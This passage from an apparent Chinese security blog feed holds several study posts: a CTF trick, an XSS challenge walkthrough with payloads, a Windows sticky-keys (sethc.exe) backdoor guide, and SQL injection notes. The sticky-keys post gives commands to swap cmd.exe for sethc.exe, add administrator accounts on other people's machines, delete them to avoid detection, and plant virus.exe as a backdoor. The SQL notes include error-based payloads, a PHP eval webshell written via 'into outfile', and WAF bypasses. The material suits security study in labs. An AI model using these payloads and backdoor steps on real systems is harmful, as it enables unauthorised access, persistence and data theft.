<p>先用ls&gt;z把所有文件写入到z文件里，查看z文件发现原来有index.php和nepctf.php两个文件</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210324170429818.png" alt="image-20210324170429818"></p>
<p>然后再写入一个cat文件，最后用*&gt;z把两个文件内容写入z文件，最后访问z文件，得到flag</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210324173713534.png" alt="image-20210324173713534"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>prompt(1)-to-win学习记录</title>
    <url>/2020/04/27/prompt1-to-win/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在大致对前端的知识有些了解过后，开始学习安全，首先从XSS开始学习，这里记录一个XSS练习平台<a href="http://prompt.ml/0" target="_blank" rel="noopener">prompt(1) to win</a>的学习,如有不对的地方，欢迎大佬斧正！<a id="more"></a></p>
<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    &#x2F;&#x2F; warm up</span><br><span class="line">    &#x2F;&#x2F; script should be executed without user interaction</span><br><span class="line">    return &#39;&lt;input type&#x3D;&quot;text&quot; value&#x3D;&quot;&#39; + input + &#39;&quot;&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一关比较简单，没有什么过滤，只要闭合标签就可以了</p>
<p>payload：</p>
<p><code>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</code></p>
<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    &#x2F;&#x2F; tags stripping mechanism from ExtJS library</span><br><span class="line">    &#x2F;&#x2F; Ext.util.Format.stripTags</span><br><span class="line">    var stripTagsRE &#x3D; &#x2F;&lt;\&#x2F;?[^&gt;]+&gt;&#x2F;gi;</span><br><span class="line">    input &#x3D; input.replace(stripTagsRE, &#39;&#39;);</span><br><span class="line"></span><br><span class="line">    return &#39;&lt;article&gt;&#39; + input + &#39;&lt;&#x2F;article&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有一个正则过滤/&lt;/?[^&gt;]+&gt;/gi，大概的意思就是把像&lt;…&gt;或者&lt;/…&gt;的内容全部替换为空。在HTML中即使没有结束标签(即没有后面的 &gt; 或者没有后面的&lt;/……&gt;)，大多数浏览器也可以正常解析。</p>
<p>可以利用自闭和标签来XSS，参考网上大佬的wp。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;alert(1)&quot;</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;&quot;alert(1)&quot;</span><br><span class="line">&lt;body onload&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
<p>那么就可以使用不闭合的标签来构造payload：</p>
<p><code>&lt;img src=0 onerror=prompt(1)</code></p>
<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    &#x2F;&#x2F;                      v-- frowny face</span><br><span class="line">    input &#x3D; input.replace(&#x2F;[&#x3D;(]&#x2F;g, &#39;&#39;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ok seriously, disallows equal signs and open parenthesis</span><br><span class="line">    return input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正则把输入中的=和(替换为空，可以用svg标签+HTML字符实体绕过正则，看网上的wp说svg标签会转化html编码进行解析，这里涉及到浏览器解析顺序的问题，不是很明白，还有待学习。</p>
<p>payload：<br><code>&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;/script&gt;</code></p>
<p>翻了很多wp，大部分都是用svg标签去解析html编码，但还发现其他解法：首先`字符是可以把包裹住的字符串当成字符，同时把unicode转化为正常字符，即可成功alert。我没看懂，记录下来方便日后学习：</p>
<p>payload：</p>
<p><code>&lt;script&gt;eval.call</code>${‘prompt\x281)’}<code>&lt;/script&gt;</code></p>
<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    &#x2F;&#x2F; filter potential comment end delimiters</span><br><span class="line">    input &#x3D; input.replace(&#x2F;-&gt;&#x2F;g, &#39;_&#39;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; comment the input to avoid script execution</span><br><span class="line">    return &#39;&lt;!-- &#39; + input + &#39; --&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正则过滤了-&gt;,HTML5的注释写法有两种<code>&lt;!--XXX--&gt;和&lt;!--XXX--!&gt;都可</code>这题可以用–!&gt;绕过正则。</p>
<p>payload：<br><code>--!&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</code></p>
<h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    &#x2F;&#x2F; make sure the script belongs to own site</span><br><span class="line">    &#x2F;&#x2F; sample script: http:&#x2F;&#x2F;prompt.ml&#x2F;js&#x2F;test.js</span><br><span class="line">    if (&#x2F;^(?:https?:)?\&#x2F;\&#x2F;prompt\.ml\&#x2F;&#x2F;i.test(decodeURIComponent(input))) &#123;</span><br><span class="line">        var script &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">        script.src &#x3D; input;</span><br><span class="line">        return script.outerHTML;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &#39;Invalid resource.&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>@黑魔法，这题利用了 <a href="http://user:password@attacker.com" target="_blank" rel="noopener">http://user:password@attacker.com</a> 的方式访问外部的js文件来弹xss，但是 <a href="http://user:password/@attacker.com">http://user:password/@attacker.com</a> 不允许这样写，但正则却要加/，利用decodeURIComponent函数，把/进行url编码变成%2f，这样既能绕过正则，同时也能访问外部js文件。</p>
</blockquote>
<p>payload:</p>
<p><code>http://prompt.ml%2f@external.js</code></p>
<h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    &#x2F;&#x2F; apply strict filter rules of level 0</span><br><span class="line">    &#x2F;&#x2F; filter &quot;&gt;&quot; and event handlers</span><br><span class="line">    input &#x3D; input.replace(&#x2F;&gt;|on.+?&#x3D;|focus&#x2F;gi, &#39;_&#39;);</span><br><span class="line"></span><br><span class="line">    return &#39;&lt;input value&#x3D;&quot;&#39; + input + &#39;&quot; type&#x3D;&quot;text&quot;&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正则过滤了&gt;、onXXX=、focus，但是正则没有进行多行匹配(/xxx/m),所以可以通过换行来绕过onerror=的过滤，然后通过 “ 闭合value，再用type=image，把input标签变成img标签,再配合onerror就可以了。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;type&#x3D;image src&#x3D;0 onerror</span><br><span class="line">&#x3D;prompt(1)</span><br></pre></td></tr></table></figure>

<h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    &#x2F;&#x2F; let&#39;s do a post redirection</span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F; pass in formURL#formDataJSON</span><br><span class="line">        &#x2F;&#x2F; e.g. http:&#x2F;&#x2F;httpbin.org&#x2F;post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span><br><span class="line">        var segments &#x3D; input.split(&#39;#&#39;);</span><br><span class="line">        var formURL &#x3D; segments[0];</span><br><span class="line">        var formData &#x3D; JSON.parse(segments[1]);</span><br><span class="line"></span><br><span class="line">        var form &#x3D; document.createElement(&#39;form&#39;);</span><br><span class="line">        form.action &#x3D; formURL;</span><br><span class="line">        form.method &#x3D; &#39;post&#39;;</span><br><span class="line"></span><br><span class="line">        for (var i in formData) &#123;</span><br><span class="line">            var input &#x3D; form.appendChild(document.createElement(&#39;input&#39;));</span><br><span class="line">            input.name &#x3D; i;</span><br><span class="line">            input.setAttribute(&#39;value&#39;, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return form.outerHTML + &#39;                         \n\</span><br><span class="line">&lt;script&gt;                                                  \n\</span><br><span class="line">    &#x2F;&#x2F; forbid javascript: or vbscript: and data: stuff    \n\</span><br><span class="line">    if (!&#x2F;script:|data:&#x2F;i.test(document.forms[0].action)) \n\</span><br><span class="line">        document.forms[0].submit();                       \n\</span><br><span class="line">    else                                                  \n\</span><br><span class="line">        document.write(&quot;Action forbidden.&quot;)               \n\</span><br><span class="line">&lt;&#x2F;script&gt;                                                 \n\</span><br><span class="line">        &#39;;</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        return &#39;Invalid form data.&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为我js语言基础不扎实，所以一开始看到这题，连题目意思都没看懂，就因为这样，我花了三天时间去菜鸟教程上翻文档，哪里不懂，哪个方法或者语法不懂就去翻，就这样找了三天，当然因为期间有很多网课所以花的时间比较长。在翻文档的期间，学到了很多，了解了JSON语言、split方法、json.parse方法、HTML DOM知识(createElement、appendChild、document.form等等)、JS正则表达式等等，让我对之前前端的学习得到了巩固与提升。</p>
<p>题意：</p>
<p>这段代码的意思就是传入一个类似 <a href="http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}" target="_blank" rel="noopener">http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}</a> 的input，然后用split把#两边的分开，再创建一个表单，把#之前的值传入form.action,把#之后json通过parse方法转成js对象再传给formData，然后为表单添加了一个input子节点,把js对象的键传给input.name.把js对象的值传给setAttribute方法新建的属性名value对应的属性值，最后return返回的就是一个带有input的form，然后就是用正则表达式来限制form.action中不能有script:或者data:，这个正则的意思大概就是限制了在form.action中使用javascript:伪协议。</p>
<p>题解：</p>
<p>虽然有个正则限制了form.action中使用js伪协议，但是action有个很奇怪的特性，如果前后都有action，访问action标签时访问的是后面的action的值，也就是说document.form[0].action在访问action时，会先选择表单中name为action的输入框，如果找不到，才会选择form标签的action属性值。根据这个特性就可以构造payload绕过正则。</p>
<p>payload：</p>
<p><code>javascript:prompt(1)#{&quot;action&quot;:&quot;xxx&quot;}</code></p>
<h1 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    &#x2F;&#x2F; pass in something like dog#cat#bird#mouse...</span><br><span class="line">    var segments &#x3D; input.split(&#39;#&#39;);</span><br><span class="line">    return segments.map(function(title) &#123;</span><br><span class="line">        &#x2F;&#x2F; title can only contain 12 characters</span><br><span class="line">        return &#39;&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;&#39; + title.slice(0, 12) + &#39;&quot;&gt;&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">    &#125;).join(&#39;\n&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题是传入abc#def……的字符串，通过split把字符串分成字符串数组，map()方法返回一个新数组，数组中的元素是原始数组元素调用函数处理后的值，函数内通过slice方法把数组元素切片，也就是说每个元素限制成12个字符长，处理完后再加个换行符。为了突破12个字符长度限制，利用注释实现payload的拼接。这个题目巧妙地利用了js的注释，我觉得很有意思。</p>
<p>payload：</p>
<p><code>&quot;&gt;&lt;script&gt;/*#*/prompt(1/*#*/)&lt;/script&gt;</code></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>shift后门漏洞复现</title>
    <url>/2021/04/13/shift-vulnerability/</url>
    <content><![CDATA[<p>看了Y4佬的博客知道了这个漏洞，挺有意思的，所以学习复现一下<a id="more"></a></p>
<h2 id="shift简介"><a href="#shift简介" class="headerlink" title="shift简介"></a>shift简介</h2><p>windows系统连按5下shift键会弹出一个粘滞键窗口</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210412195621193.png" alt="image-20210412195621193"></p>
<p>即启动了System32目录下的sethc.exe文件</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210412200100644.png" alt="image-20210412200100644"></p>
<p>它本来的作用是给同时按下两个或多个键有困难的人设计的，启用之后可以一次按一个键达到组合键的效果。这个功能普通人基本用不到，我也是在学这个漏洞的时候才知道有这个东西的。</p>
<p>在登入状态，连按5次shift键会以当前用户权限执行sethc.exe；在登陆界面还进入系统时，没有用户的概念，所以会以最高权限(管理员权限)system执行。该功能存在安全隐患</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我看师傅们称之为偷天换日：</p>
<p>连按5次shift键，windows系统会启动System32目录下的sethc.exe文件，可以用cmd.exe或者其他木马后门文件替换粘滞键exe文件，之后再连按5次shift键启动的就是我们替换的文件了。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="破解开机密码"><a href="#破解开机密码" class="headerlink" title="破解开机密码"></a>破解开机密码</h3><p>如果有条件的话，用U盘破解密码简单高效，没有启动盘就可以用这个方法试试了。</p>
<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>cmd程序路径：</p>
<p>C:\Windows\System32\cmd.exe</p>
<p>sethc程序路径：</p>
<p>C:\Windows\System32</p>
<p>修改账户密码：</p>
<p>net user username password</p>
<p>添加账户密码：</p>
<p>net user username password /add</p>
<p>把账户添加到administrators(管理员)用户组里：</p>
<p>net localgroup administrators username /add</p>
<p>文件重命名：</p>
<p>ren &lt;旧文件名&gt; &lt;新文件名&gt;</p>
<p>切换磁盘：</p>
<p>&lt;盘符&gt;冒号</p>
<p>同磁盘下切换工作目录：</p>
<p>cd \路径</p>
<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><h4 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h4><p>1、未登录系统时，连按5次shift键，若弹出粘滞键窗口则存在漏洞</p>
<p>2、强制关机让电脑进入”自动修复”界面</p>
<p>3、依次选择”高级选项”、”疑难解答”、”高级选项”、”命令提示符”</p>
<p>4、在命令行窗口先将sethc.exe备份一个副本(取个别名)，然后用cmd程序替换掉sethc程序(或者用notepad命令调出记事本，然后改文件名也行)</p>
<p>5、重启后在登录界面连按5次shift键，弹出cmd窗口，再输入命令修改登陆密码或者添加账户。</p>
<h4 id="详细截图"><a href="#详细截图" class="headerlink" title="详细截图"></a>详细截图</h4><p>虚拟机开机，当出现Windows图标时，就强制关机(右键-&gt;电源-&gt;关闭客户机)，重复2-3次，模拟生活中出现的不正常关机，然后进入自动修复界面</p>
<p>基本硬关机2次之后再开机就进入了自动修复界面</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210412220440087.png" alt="image-20210412220440087"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210412220450516.png" alt="image-20210412220450516"></p>
<p>高级选项</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210412220542972.png" alt="image-20210412220542972"></p>
<p>疑难解答</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210412213829683.png" alt="image-20210412213829683"></p>
<p>高级选项</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210412213852952.png" alt="image-20210412213852952"></p>
<p>命令提示符</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210412214022673.png" alt="image-20210412214022673"></p>
<p>直接出现了cmd窗口，而且权限为system</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210412220638168.png" alt="image-20210412220638168"></p>
<p>但是这里在X盘，不在C盘，这里我不明白这个X盘是哪来的，以后有机会再学习下。</p>
<p>然后输入以下命令即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:</span><br><span class="line">cd windows\system32</span><br><span class="line">&#x2F;&#x2F;下面就是最巧妙的&quot;偷天换日&quot;了</span><br><span class="line">ren sethc.exe abc.exe      &#x2F;&#x2F;abc文件名随意取,别和同目录文件重名应该就行了</span><br><span class="line">ren cmd.exe sethc.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210413130145867.png" alt="image-20210413130145867"></p>
<p>或者用notepad命令调出记事本，文件选择打开</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210413131805706.png" alt="image-20210413131805706"></p>
<p>选择所有文件</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210413131842015.png" alt="image-20210413131842015"></p>
<p>再找到sethc.exe和cmd.exe，做一下替换</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210413132141004.png" alt="image-20210413132141004"></p>
<p>好了之后关掉窗口选择继续，或者直接重启都行<img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210413131524377.png" alt="image-20210413131524377"></p>
<p>重启后在登录界面连按5次shift键，成功弹出cmd命令行，这个命令行存在时间限制，快点输入命令添加用户</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210413132736351.png" alt="image-20210413132736351"></p>
<p>这里可扩展性很强，你可以修改原账户密码为空，也可以创建新账户，创建新账户还涉及到创建隐藏账户，这个涉及到权限维持了，我还没学习过，先不弄了。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210413133018363.png" alt="image-20210413133018363"></p>
<p>重启后出现了前面创建的用户，成功登录系统</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210413133914324.png" alt="image-20210413133914324"></p>
<p>这里把原账户密码设置为空，相当于无密码可以直接登录</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210413135537339.png" alt="image-20210413135537339"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210413134732365.png" alt="image-20210413134732365"></p>
<p>创建新用户一般是在别人的电脑上用的，因为如果你改了别人账户密码，别人下次登录就被发现有问题了，创建新账号进入系统，最后不要忘了把新建账户删了，防止被发现。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210413135212460.png" alt="image-20210413135212460"></p>
<h3 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h3><p>如果渗透时拿到较高权限的shell可以直接在shell里执行命令(需要管理员权限)</p>
<p>然后制作一些木马程序替换掉sethc.exe就行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy C:\Windows\System32\virus.exe C:\Windows\System32\sethc.exe</span><br></pre></td></tr></table></figure>

<p>或者直接手动替换(需要管理员权限)</p>
<p>权限不够的话需要提权</p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>方案一：禁用shift粘滞键功能</p>
<p>方案二：删除sethc.exe程序所有用户运行权限</p>
<p>方案三：添加一个”Everyone”用户组，权限拒绝所有</p>
<p>以上方案参考网上资料的，由于网上很多都是windows老版本，我复现用的是win10，权限控制这一块好像管的严我弄不来，没有实操方案二和方案三，但可以学习其权限控制的思想</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://y4tacker.blog.csdn.net/article/details/106946893" target="_blank" rel="noopener">https://y4tacker.blog.csdn.net/article/details/106946893</a></p>
<p><a href="https://ysneko.com/archives/250/" target="_blank" rel="noopener">https://ysneko.com/archives/250/</a></p>
<p><a href="https://www.cnblogs.com/BOHB-yunying/p/11695140.html" target="_blank" rel="noopener">https://www.cnblogs.com/BOHB-yunying/p/11695140.html</a></p>
<p><a href="https://blog.csdn.net/qq_46620129/article/details/113204312" target="_blank" rel="noopener">https://blog.csdn.net/qq_46620129/article/details/113204312</a></p>
<p><a href="https://blog.csdn.net/zzgslh/article/details/105651132" target="_blank" rel="noopener">https://blog.csdn.net/zzgslh/article/details/105651132</a></p>
<p><a href="https://blog.csdn.net/weixin_43178927/article/details/88841953" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43178927/article/details/88841953</a></p>
<p>[<a href="https://mochazz.github.io/2017/07/29/shift/#%E5%81%B7%E5%A4%A9%E6%8D%A2%E6%97%A5" target="_blank" rel="noopener">https://mochazz.github.io/2017/07/29/shift/#%E5%81%B7%E5%A4%A9%E6%8D%A2%E6%97%A5</a></p>
<p><a href="https://mochazz.github.io/2017/07/29/shift/#偷天换日" target="_blank" rel="noopener">https://blog.csdn.net/SuperChanon/article/details/8255566</a></p>
<p><a href="https://blog.csdn.net/auuuuuuuu/article/details/88902791" target="_blank" rel="noopener">https://blog.csdn.net/auuuuuuuu/article/details/88902791</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>sql注入学习笔记</title>
    <url>/2020/09/26/SQL-injection-study-notes/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>sql注入作为owasp top 10的榜首，其重要程度不言而喻。这里我通过对sqli-labs靶场的练习，来学习和入门sql注入。<a id="more"></a></p>
<h1 id="0x00靶场搭建"><a href="#0x00靶场搭建" class="headerlink" title="0x00靶场搭建"></a>0x00靶场搭建</h1><p>1.phpstudy</p>
<p>2.docker</p>
<p>具体搭建方法自行搜索</p>
<h1 id="0x01个人学习笔记"><a href="#0x01个人学习笔记" class="headerlink" title="0x01个人学习笔记"></a>0x01个人学习笔记</h1><p>sql注入过程:</p>
<p>判断注入点和注入类型  ‘、’)、’))、”、”)、”))</p>
<p>判断字段数 order by或者union select</p>
<p>判断显示位</p>
<p>爆数据库SELECT * FROM information_schema.schemata</p>
<p>获取表民 select table_name from information_schema.tables where table_schema=database()</p>
<p>获取字段名 select column_name from information_schema.columns where table_name=’xxx’</p>
<p>获取数据 select xxx from table_name</p>
<p>系统函数 </p>
<ol>
<li>version()——MySQL 版本 </li>
<li>user()——数据库用户名 </li>
<li>database()——数据库名 </li>
<li>@@datadir——数据库路径 </li>
<li>@@version_compile_os——操作系统版本</li>
</ol>
<p>联合注入、双查询注入、盲注、报错注入、宽字节注入</p>
<p>注释: –+(get)、#(post)、 /*   */</p>
<p>字符拼接:concat、concat_ws、group_concat</p>
<p>盲注思路</p>
<p>猜表数</p>
<p>逐个猜解表长和表名</p>
<p>逐个猜解每个表的列数、列长、列名</p>
<p>获取数据</p>
<p>布尔盲注、时间盲注、报错盲注</p>
<p>盲注函数<br>ascii()、ord()、chr()<br>substr()、left()、mid()<br>regexp ‘^xxx’、like ‘xxx%’<br>if()<br>length()<br>count()<br>sleep()</p>
<p>聚合函数和group by报错 floor(rand(0)*2)报错输出字符限制64个<br>手工盲注非常费时，仅需了解原理即可。最好用自动化脚本盲注，自己用python写脚本或者使用sqlmap等工具。</p>
<p>报错注入</p>
<p>1.主键重复floor报错<br>select count(<em>),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),’~’,floor(rand(0)</em>2))a from information_schema.tables group by a–+</p>
<p>如果关键表被禁用的payload</p>
<p>select count(<em>) from ((select 1 union select null union select !1)a) group by concat(version(),’~’,floor(rand(0)</em>2))–+</p>
<p>2.exp报错(double数据溢出)<br>select exp(~(select * from(select table_name from information_schema.tables where table_schema=database() limit 0,1)a))–+</p>
<p>3.Xpath报错<br>and extractvalue(1,concat(0x7e,(select version()),0x7e))–+<br>and updatexml(1,concat(0x7e,(select version()),0x7e),1)–+<br>updatexml和extractvalue原理相同,只是updatexml函数多一个参数。</p>
<p>4.Bigint溢出报错  利用逐位取反~和逻辑取反!，可以构造出很多种的Bigint溢出<br>select (!(select * from (select user())a) - ~0),2,3–+</p>
<p>5.name_const()列名重复报错<br>select * from(select name_const(version(),1),name_const(version(),1))a–+</p>
<p>name_const函数要求参数必须是常量所以要配合join函数使用(网上的payload好像不行，而且关于join这个函数没有找到比较详细的解释，不太懂）</p>
<p>6.空间数据类型函数错误(几何函数)</p>
<p>mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()<br>这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行<br>select * from products where pid=1 and geometrycollection((select * from(select * from(select user())a)b))–+</p>
<p>select * from products where pid=1 and multipoint((select * from(select * from(select user())a)b))–+</p>
<p>select * from products where pid=1 and polygon((select * from(select * from(select user())a)b))–+</p>
<p>select * from products where pid=1 and multipolygon((select * from(select * from(select user())a)b))–+</p>
<p>select * from products where pid=1 and linestring((select * from(select * from(select user())a)b))–+</p>
<p>select * from products where pid=1 and multilinestring((select * from(select * from(select user())a)b))–+</p>
<p>into outfile导入文件<br>select ‘<?php @eval($_POST['password']);?>‘ into outfile ‘c:\\xxx\\xx\\shell.php’   用\\是为了防止转义，写一句话用蚁剑连接。</p>
<p>宽字节注入 </p>
<p>GB2312 GBK GB18030等等都是宽字节编码，即两个字节表示一个中文（前一个ascii码大于128，为汉字范围）</p>
<p>‘ 过滤后变成 &#39;   把前面的\去掉有两种思路：</p>
<p>1.用%df吃掉 \。%5c表示\，那么%df%5c就是一个汉字</p>
<p>2.将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。</p>
<p>堆叠注入</p>
<p>通过 ; 再连接一个select语句，可以增删改查，可以写一句话脚本</p>
<p>order by后的注入</p>
<p>order by默认升序排序    加上desc就是降序</p>
<p>?sort=1 into outfile ‘xxxx’ lines terminated by 0x（十六进制转码的一句话），可以把排序的结果导出，并在每行最后加入一句话。</p>
<p>1.直接添加查询语句，?sort=sql语句</p>
<p>2.利用一些函数，如rand()函数，?rand(sql语句) ，此外，rand(true)和rand(false)的结果是不一样的</p>
<p>3.利用and，?sort=x and sql语句</p>
<p>sql语句可以利用报错注入和时间盲注</p>
<p>4.procedure analyse参数后注入,利用procedure analyse参数，可以执行报错注入，?sort=1 procedure analyse(extractvalue(1,concat(0x7e,xxxx)))</p>
<p>waf绕过</p>
<p>1.白盒绕过：知道源代码，通过代码审计</p>
<p>2.黑盒绕过：</p>
<p>架构层面绕过waf：</p>
<p>(1).寻找源网站绕过waf检测，主要针对云waf，找到源网站的真实ip地址进行绕过，有点像CDN</p>
<p>(2).通过同网段绕过waf，在同一个网段中，可能经过的数据不会经过云waf，从来实现绕过</p>
<p>资源限制角度绕过waf：一般waf的执行需要优先考虑业务优先的原则，所以对于构造较大、超大数据包可能不会进行检测，从而实现绕过waf</p>
<p>协议层面绕过waf</p>
<p>(1).协议未覆盖绕过waf，比如由于业务需要，只对get型进行检测，post数据选择忽略</p>
<p>(2).参数污染，index?id=1&amp;id=2 waf可能只对id=1进行检测          （服务器两层架构)</p>
<p>规则层面绕过waf</p>
<p>基本方法有：大小写变形、双写、编码(hex、urlencode)、添加注释/**/、利用符号and=&amp;&amp; or=||  like可以替换=  &lt;&gt;等价于!=</p>
<p>注释符绕过，用/**/代替空格进行绕过</p>
<p>空白符绕过，mysql空白符%09; %0A; 或/**/等等</p>
<p>函数分割符号，例如concat/**/(</p>
<p>浮点数词法解释 waf对于id=1可以检测，但是对于id=1E0、id=1.0、id=\N可能就无法检测</p>
<p>利用报错注入</p>
<p>mysql特殊语法：select{x 1}   select {x schema_name} from {x information_schema.schemata} </p>
<p>3.fuzz模糊测试，可以用burpsuite配合手工进行测试，测试成功后再用脚本进行处理</p>
<h1 id="0x02参考资料"><a href="#0x02参考资料" class="headerlink" title="0x02参考资料"></a>0x02参考资料</h1><p>在进行靶场注入学习的过程中，我搜索了很多的write up和文章，我觉得写的比较好的是<a href="https://www.bilibili.com/video/BV1e441127Rd?from=search&seid=7152236715376995357" target="_blank" rel="noopener">b站视频</a>、<a href="https://www.cnblogs.com/lcamry/p/5763169.html" target="_blank" rel="noopener">注入天书</a>、<a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">报错注入总结</a></p>
<h1 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h1><p>通过sqli-labs的练习，基本入门了sql注入，然而我认为这还远远不够。对于盲注，还需要学习python脚本的编写，通过脚本进行自动化注入，也可以使用sqlmap工具。对于刚入门的我，以后还有很多东西要学，各种绕过的姿势等等</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>浅谈SSRF</title>
    <url>/2021/03/03/SSRF/</url>
